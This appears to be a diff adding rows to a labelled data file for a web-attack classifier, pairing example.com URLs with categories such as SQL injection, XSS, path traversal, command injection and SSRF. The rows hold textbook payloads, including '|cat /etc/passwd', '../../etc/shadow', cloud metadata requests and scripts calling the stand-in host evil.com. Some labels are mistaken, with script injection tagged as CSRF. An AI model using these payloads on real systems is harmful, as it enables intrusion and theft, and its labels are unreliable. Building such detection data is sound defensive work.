+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=feedback,NONE,Safe input
+https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?redirect=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?token=category%3Dbooks,NONE,Safe input
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?url=hello,NONE,Safe input
+https://example.com/?q=apple,NONE,Safe input
+https://example.com/?redirect=apple,NONE,Safe input
+https://example.com/?data=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?q=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?path=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?id=banana,NONE,Safe input
+https://example.com/?cmd=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?token=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=hello,NONE,Safe input
+https://example.com/?search=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=user123,NONE,Safe input
+https://example.com/?input=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?q=name%3DJohnDoe,NONE,Safe input
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=lang%3Den,NONE,Safe input
+https://example.com/?redirect=id%3D567,NONE,Safe input
+https://example.com/?url=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?data=banana,NONE,Safe input
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?file=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?user=filter%3Dpopular,NONE,Safe input
+https://example.com/?path=id%3D567,NONE,Safe input
+https://example.com/?data=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?user=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?q=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?redirect=apple,NONE,Safe input
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=about-us,NONE,Safe input
+https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?content=category%3Dbooks,NONE,Safe input
+https://example.com/?id=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?path=name%3DJohnDoe,NONE,Safe input
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?token=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?data=search%3Dproducts,NONE,Safe input
+https://example.com/?input=logout%3Dtrue,NONE,Safe input
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?data=logout%3Dtrue,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?file=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?redirect=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?token=about-us,NONE,Safe input
+https://example.com/?token=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?q=filter%3Dpopular,NONE,Safe input
+https://example.com/?q=category%3Dbooks,NONE,Safe input
+https://example.com/?token=page%3Dhome,NONE,Safe input
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=lang%3Den,NONE,Safe input
+https://example.com/?id=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?data=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?content=logout%3Dtrue,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=id%3D567,NONE,Safe input
+https://example.com/?data=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?q=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=hello,NONE,Safe input
+https://example.com/?search=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=logout%3Dtrue,NONE,Safe input
+https://example.com/?user=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?path=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?search=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?id=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=hello,NONE,Safe input
+https://example.com/?redirect=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=page%3Dhome,NONE,Safe input
+https://example.com/?url=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?redirect=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?id=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?user=name%3DJohnDoe,NONE,Safe input
+https://example.com/?user=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=filter%3Dpopular,NONE,Safe input
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?id=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?search=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?content=hello,NONE,Safe input
+https://example.com/?id=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?user=lang%3Den,NONE,Safe input
+https://example.com/?input=query%3Dhelp,NONE,Safe input
+https://example.com/?search=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?user=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?url=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?id=hello,NONE,Safe input
+https://example.com/?user=user123,NONE,Safe input
+https://example.com/?path=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?data=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?content=query%3Dhelp,NONE,Safe input
+https://example.com/?content=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?input=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?id=page%3Dhome,NONE,Safe input
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?path=filter%3Dpopular,NONE,Safe input
+https://example.com/?search=name%3DJohnDoe,NONE,Safe input
+https://example.com/?path=user123,NONE,Safe input
+https://example.com/?path=filter%3Dpopular,NONE,Safe input
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?content=filter%3Dpopular,NONE,Safe input
+https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?cmd=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?file=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?input=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?file=search%3Dproducts,NONE,Safe input
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?token=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?id=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?path=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?file=feedback,NONE,Safe input
+https://example.com/?redirect=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?q=apple,NONE,Safe input
+https://example.com/?q=feedback,NONE,Safe input
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?data=feedback,NONE,Safe input
+https://example.com/?token=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
